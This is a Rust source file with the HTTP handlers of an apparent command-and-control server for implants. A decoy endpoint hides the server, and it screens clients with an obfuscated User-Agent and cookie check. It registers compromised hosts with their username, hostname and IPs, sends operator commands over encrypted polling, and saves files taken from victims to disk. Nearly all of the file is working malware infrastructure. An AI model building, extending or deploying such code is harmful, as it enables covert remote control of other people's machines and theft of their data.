use actix_web::{web, HttpRequest, HttpResponse, Responder};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use colored::Colorize;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::links::{Links, NewLink};
use obfstr::obfstr;

pub struct AppState {
    pub links: Arc<Mutex<Links>>,
}

/// Derive a 32-byte key from secret and salt using SHA-256.
/// Must stay aligned with link-common::derive_key (same algorithm).
fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
    use sha2::{Digest, Sha256};

    let mut hasher = Sha256::new();
    hasher.update(secret);
    hasher.update(salt.as_bytes());
    let result = hasher.finalize();
    let mut key = [0u8; 32];
    key.copy_from_slice(&result[..32]);
    key
}

/// Encrypt payload data using AES-256-GCM
fn encrypt_payload(data: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("Failed to create cipher");
    let ciphertext = cipher
        .encrypt(nonce, data.as_bytes())
        .expect("Encryption failure");

    let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
    result.extend_from_slice(nonce);
    result.extend_from_slice(&ciphertext);
    hex::encode(result)
}

/// Decrypt payload data using AES-256-GCM
fn decrypt_payload(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    let encrypted_data = hex::decode(encrypted_hex).ok()?;
    if encrypted_data.len() < 12 {
        return None;
    }
    let nonce = Nonce::from_slice(&encrypted_data[..12]);
    let ciphertext = &encrypted_data[12..];
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    match cipher.decrypt(nonce, ciphertext) {
        Ok(decrypted) => String::from_utf8(decrypted).ok(),
        Err(_) => None,
    }
}

// ── Request/Response types ──────────────────────────────────────────────────

#[derive(Deserialize)]
pub struct RegisterRequest {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    #[serde(default)]
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

#[derive(Deserialize)]
pub struct CallbackRequest {
    /// Hex-encoded encrypted payload (nonce || ciphertext)
    #[serde(default)]
    pub data: Option<String>,
    /// For backward compatibility during transition
    #[serde(default)]
    pub q: String,
    /// For backward compatibility during transition
    #[serde(default)]
    pub tasking: String,
}

#[derive(Serialize)]
struct TaskResponse {
    /// Hex-encoded encrypted payload (nonce || ciphertext)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<String>,
    /// Rolling request ID; implant must echo this on the next call.
    x_request_id: String,
    /// For backward compatibility during transition
    #[serde(default)]
    q: String,
    /// For backward compatibility during transition
    #[serde(default)]
    tasking: String,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    file: Option<String>,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    filename: Option<String>,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    upload: Option<String>,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    upload_path: Option<String>,
}

// ── Header guards ───────────────────────────────────────────────────────────

fn ua_ok(req: &HttpRequest) -> bool {
    let expected_str = obfstr!("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko").to_string();
    let ua = req.headers()
        .get("User-Agent")
        .and_then(|v| v.to_str().ok());
    match ua {
        Some(ua) => ua == expected_str,
        None => false,
    }
}

fn cookie_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("Cookie")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|c| c.contains(obfstr!("banner=banner")))
}

fn parse_file_response(response: &str) -> Option<(String, String)> {
    if response.starts_with("FILE:") {
        let parts: Vec<&str> = response.splitn(3, ':').collect();
        if parts.len() == 3 {
            return Some((parts[1].to_string(), parts[2].to_string()));
        }
    }
    None
}

// ── Input validation ─────────────────────────────────────────────────────────

/// Truncate a String to at most `max` bytes, preserving UTF-8 boundaries.
fn truncate_field(mut s: String, max: usize) -> String {
    if s.len() > max {
        // Truncate at a valid char boundary
        let boundary = s
            .char_indices()
            .map(|(i, _)| i)
            .take_while(|&i| i < max)
            .last()
            .unwrap_or(0);
        s.truncate(boundary);
    }
    s
}

// ── File download storage ────────────────────────────────────────────────────

/// Decode a base64-encoded file and write it to `downloads/<link_name>/<filename>`.
/// Returns the path where the file was written, or an error string.
fn save_download(link_name: &str, remote_path: &str, b64_content: &str) -> Result<PathBuf, String> {
    let filename = std::path::Path::new(remote_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".to_string());

    let dest_dir = PathBuf::from("downloads").join(link_name);
    std::fs::create_dir_all(&dest_dir)
        .map_err(|e| format!("[-] Failed to create downloads dir: {}", e))?;

    let data = STANDARD
        .decode(b64_content)
        .map_err(|e| format!("[-] Failed to decode file content: {}", e))?;

    let dest = dest_dir.join(&filename);
    std::fs::write(&dest, &data).map_err(|e| format!("[-] Failed to write file: {}", e))?;

    Ok(dest)
}

// ── Handlers ────────────────────────────────────────────────────────────────

/// GET / – decoy for non-implant traffic.
pub async fn ok_handler() -> impl Responder {
    HttpResponse::Ok().body("Ok\n")
}

/// GET /js – Stage 1: set session cookie, validate User-Agent.
pub async fn stage1_handler(req: HttpRequest) -> impl Responder {
    if !ua_ok(&req) {
        return HttpResponse::NotFound().finish();
    }
    HttpResponse::Ok()
        .insert_header(("Set-Cookie", obfstr!("banner=banner; Path=/")))
        .body("")
}

/// POST /static/register – Stage 2: implant registration.
pub async fn stage2_handler(
    req: HttpRequest,
    body: web::Json<RegisterRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    // 0.5.8 — validate/truncate fields to prevent OOM from malicious payloads
    let username = truncate_field(body.link_username.clone(), 256);
    let hostname = truncate_field(body.link_hostname.clone(), 256);
    let internal_ip = truncate_field(body.internal_ip.clone(), 45);
    let external_ip = truncate_field(body.external_ip.clone(), 45);
    let platform = truncate_field(body.platform.clone(), 64);

    let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
    // Extract the implant secret from the request headers
    let secret = req
        .headers()
        .get("X-Client-ID")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
        .unwrap_or_else(|| {
            // Generate a fallback secret if not provided (for backward compatibility)
            hex::encode(rand::random::<[u8; 32]>())
        });

    let link = links.add_link(NewLink {
        username,
        hostname,
        internal_ip,
        external_ip,
        platform,
        pid: body.pid,
        secret,
    });

    let resp = TaskResponse {
        data: None,
        x_request_id: link.x_request_id.to_string(),
        q: String::new(),
        tasking: String::new(),
        file: None,
        filename: None,
        upload: None,
        upload_path: None,
    };
    let link_name = link.name.clone();
    drop(links);

    tracing::info!(
        "New link: {} ({}@{}) [{}]",
        link_name,
        body.link_username,
        body.link_hostname,
        body.platform
    );
    crate::ui::print_cyan_bold(&format!(
        "[+] New link arrived: {} ({}@{}) [{}]",
        link_name, body.link_username, body.link_hostname, body.platform
    ));

    HttpResponse::Ok().json(resp)
}

/// POST /static/get – Stage 3: task polling / output callback.
///
/// Lock strategy (0.5.7): at most 2 Mutex acquisitions per request.
///  • Lock 1: resolve link_id from x-request-id.
///  • Lock 2 (conditional): process output, complete task, then release.
///    UI printing happens outside the lock.
///  • Lock 3: rotate x_request_id + dispatch next task.
pub async fn stage3_handler(
    req: HttpRequest,
    body: web::Json<CallbackRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    let Some(x_req_id) = req
        .headers()
        .get("x-request-id")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| Uuid::parse_str(s).ok())
    else {
        return HttpResponse::BadRequest().finish();
    };

    // ── Lock 1: resolve link_id and get secret ────────────────────────────
    let link_data = {
        let links = data.links.lock().unwrap_or_else(|e| e.into_inner());
        links
            .find_by_request_id(x_req_id)
            .map(|l| (l.id, l.secret.clone()))
    };
    let Some((link_id, secret)) = link_data else {
        return HttpResponse::NotFound().finish();
    };
    let key = derive_key(secret.as_bytes(), obfstr!("callback-salt"));

    // ── Lock 2 (conditional): process callback output ────────────────────────
    // Collect info needed for UI printing; the lock is released before any I/O.
    let ui_message: Option<(String, String, String)>; // (link_name, cli_cmd, display_output)

    // Decrypt payload if present (new format), otherwise use legacy fields
    let decrypted_q: String;
    let decrypted_tasking: String;

    if let Some(encrypted_data) = &body.data {
        // New encrypted format
        if let Some(decrypted) = decrypt_payload(encrypted_data, &key) {
            // Parse the decrypted JSON payload
            #[derive(Deserialize)]
            struct PayloadData {
                q: String,
                tasking: String,
            }
            if let Ok(payload) = serde_json::from_str::<PayloadData>(&decrypted) {
                decrypted_q = payload.q;
                decrypted_tasking = payload.tasking;
            } else {
                decrypted_q = String::new();
                decrypted_tasking = String::new();
            }
        } else {
            decrypted_q = String::new();
            decrypted_tasking = String::new();
        }
    } else {
        // Legacy format (backward compatibility)
        decrypted_q = body.q.clone();
        decrypted_tasking = body.tasking.clone();
    }

    if !decrypted_tasking.is_empty() {
        if let Ok(task_id) = Uuid::parse_str(&decrypted_tasking) {
            if !decrypted_q.is_empty() {
                let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());

                let (link_name, cli_cmd) = links
                    .get_link(link_id)
                    .map(|l| {
                        let cmd = l
                            .tasks
                            .iter()
                            .find(|t| t.id == task_id)
                            .map(|t| t.cli_command.clone())
                            .unwrap_or_default();
                        (l.name.clone(), cmd)
                    })
                    .unwrap_or_else(|| ("unknown".into(), String::new()));

                let is_download = cli_cmd.starts_with("download ");

                if is_download && decrypted_q.starts_with("FILE:") {
                    // Save the file to disk; store path in task output.
                    if let Some((file_path, file_content)) = parse_file_response(&decrypted_q) {
                        let display_msg = match save_download(&link_name, &file_path, &file_content)
                        {
                            Ok(dest) => {
                                let msg = format!("[+] File saved to {}", dest.display());
                                if let Some(link) = links.get_link_mut(link_id) {
                                    if let Some(task) =
                                        link.tasks.iter_mut().find(|t| t.id == task_id)
                                    {
                                        task.file_name = Some(file_path.clone());
                                        task.output = msg.clone();
                                    }
                                }
                                msg
                            }
                            Err(e) => e,
                        };
                        ui_message = Some((link_name, cli_cmd, display_msg));
                    } else {
                        ui_message = None;
                    }
                } else {
                    ui_message = Some((link_name, cli_cmd, decrypted_q.clone()));
                }

                // Pour les downloads, préserver le message user-friendly
                // plutôt que le blob brut FILE:path:base64
                let complete_output = if is_download {
                    ui_message
                        .as_ref()
                        .map(|(_, _, msg)| msg.clone())
                        .unwrap_or_else(|| decrypted_q.clone())
                } else {
                    decrypted_q.clone()
                };
                links.complete_task(link_id, task_id, complete_output);
                // Marquer affichée : routes.rs l'imprime en temps réel,
                // ce qui évite le double affichage dans show_completed_task_results() (cli.rs).
                if let Some(link) = links.get_link_mut(link_id) {
                    if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
                        task.displayed = true;
                    }
                }
            } else {
                ui_message = None;
            }
        } else {
            ui_message = None;
        }
    } else {
        ui_message = None;
    }

    // Print to console outside the lock.
    if let Some((link_name, cli_cmd, output)) = ui_message {
        const OUTPUT_BOX_WIDTH: usize = 54;
        let now = chrono::Local::now().format("%H:%M:%S");
        let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
        let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
        crate::ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
        crate::ui::print(&format!("║ {}", output));
        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
        tracing::info!(
            "\n{}\n{}\n{}",
            format!("╔{}{}╗", header_text, "═".repeat(pad))
                .cyan()
                .bold(),
            output,
            format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold(),
        );
    }

    // ── Lock 3: rotate request ID + dispatch next task ───────────────────────
    let new_x_req_id = Uuid::new_v4();
    let (q, tasking, file, filename, upload, upload_path) = {
        let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
        links.update_checkin(link_id, new_x_req_id);
        links
            .get_next_task(link_id)
            .map(|d| {
                (
                    d.command,
                    d.task_id,
                    d.file_content,
                    d.file_name,
                    d.upload_content,
                    d.upload_path,
                )
            })
            .unwrap_or_default()
    };

    // Build response payload
    #[derive(Serialize)]
    struct ResponsePayload {
        q: String,
        tasking: String,
        file: Option<String>,
        filename: Option<String>,
        upload: Option<String>,
        upload_path: Option<String>,
    }

    let payload = ResponsePayload {
        q,
        tasking,
        file,
        filename,
        upload,
        upload_path,
    };

    let payload_json = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".to_string());
    let encrypted_data = encrypt_payload(&payload_json, &key);

    let resp = TaskResponse {
        data: Some(encrypted_data),
        x_request_id: new_x_req_id.to_string(),
        q: String::new(),
        tasking: String::new(),
        file: None,
        filename: None,
        upload: None,
        upload_path: None,
    };

    HttpResponse::Ok().json(resp)
}
